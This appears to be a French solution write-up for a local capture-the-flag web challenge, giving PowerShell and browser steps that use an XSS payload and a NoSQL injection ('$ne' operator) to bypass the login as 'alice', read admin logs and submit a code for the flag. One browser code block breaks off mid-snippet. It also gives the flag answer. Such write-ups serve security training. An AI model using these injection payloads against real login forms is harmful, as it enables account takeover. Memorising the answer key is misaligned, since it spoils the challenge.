# 1) Seed
Set-Location "c:\Users\yarno\OneDrive\Bureau\Stage CTF\CTF - Vol 404"
npm run seed

# 2) Vérif manifest
(Invoke-RestMethod -Uri 'http://localhost:3000/billets/passengers').Count

# 3) Session d’attaque (XSS puis NoSQL)
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession

$xss = @{ username = "<img src=x onerror=alert(1)>"; password = "wrong" } | ConvertTo-Json -Depth 4
try {
  Invoke-RestMethod -Uri 'http://localhost:3000/auth/login' -Method Post -ContentType 'application/json' -WebSession $session -Body $xss
} catch {}

$nosql = @{ username = "alice"; password = @{ '$ne' = '' } } | ConvertTo-Json -Depth 4
Invoke-RestMethod -Uri 'http://localhost:3000/auth/login' -Method Post -ContentType 'application/json' -WebSession $session -Body $nosql

# 4) Logs admin (doit marcher après XSS+NoSQL)
Invoke-RestMethod -Uri 'http://localhost:3000/auth/logs' -WebSession $session

# 5) Billet + QR (obligatoire)
$ticket = Invoke-RestMethod -Uri 'http://localhost:3000/billets/my' -WebSession $session
$ticket | Format-List

# 6) Scanner le QR depuis billet.html avec un téléphone (étape obligatoire)
# Le QR ouvre /gate/scan/<scanId> sur le téléphone ET declenche l'ouverture auto sur PC vers /gate/scan-result/<scanId>.

# 7) Soumettre le code département final
$flag = Invoke-RestMethod -Uri 'http://localhost:3000/flag' -Method Post -ContentType 'application/json' -WebSession $session -Body (@{ code = 94 } | ConvertTo-Json)
$flag


# 8) résultat : CTF{ORY_boarding_complete}


## Solution via le site (navigateur)

1. Ouvre http://localhost:3000
2. Affiche le code source de la page (Ctrl+U) et repere la route cachee passengers.html
3. Va sur http://localhost:3000/passengers.html pour identifier la cible alice
4. Va sur http://localhost:3000/login.html
5. Dans le formulaire, teste une XSS pour valider la premiere condition :

```text
username = <img src=x onerror=alert(1)>
password = nimportequoi
```

6. Pour la NoSQL (deuxieme condition), depuis DevTools Console sur la page login, envoie :

```javascript
fetch('/auth/login', {
  method: 'POST',

7. Verifie les logs admin dans le navigateur :

```text
http://localhost:3000/auth/logs
```

8. Ouvre http://localhost:3000/billet.html pour recuperer le billet.
9. Scan du QR obligatoire: le téléphone ouvre le JSON gate et le PC est redirige automatiquement vers le gate.
10. IMPORTANT : la page gate JSON n'est pas le flag. Elle donne seulement l'indice final (code 94).
11. Pour recuperer le flag en PowerShell, execute exactement :

```powershell
$flag = Invoke-RestMethod -Uri 'http://localhost:3000/flag' -Method Post -ContentType 'application/json' -WebSession $session -Body (@{ code = 94 } | ConvertTo-Json)
$flag
```

12. Alternative sans terminal (DevTools Console) :

```javascript
fetch('/flag', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  credentials: 'include',
  body: JSON.stringify({ code: 94 })
}).then(r => r.json()).then(console.log)
```

13. Flag attendu : CTF{ORY_boarding_complete}